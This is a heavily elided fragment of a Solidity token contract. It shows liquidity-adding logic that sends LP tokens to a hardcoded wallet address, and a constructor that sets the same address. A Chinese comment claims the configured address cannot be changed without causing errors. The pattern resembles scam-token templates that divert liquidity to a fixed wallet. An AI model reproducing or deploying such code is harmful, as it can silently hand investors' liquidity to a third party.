        ...
        if (lpAmount > 0) {
            ...
            if (lpusdtt > 0) {//=0xB821bb072f08A338962272923f9f4221B69094FC (配置地址，不能改，改了会产生错误）
                _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpusdtt, 0, 0, address(0xAECF5c11139a5304AD944A97cA20a0a7d91B4a82), block.timestamp
                );
            }
        }
    }
...
contract tokken is AToken {
    constructor() AToken(
        ...
        18,//De
        1000000000,//Su 
        address(0xAECF5c11139a5304AD944A97cA20a0a7d91B4a82),//
        address(0xAECF5c11139a5304AD944A97cA20a0a7d91B4a82)//
    ){
    }
}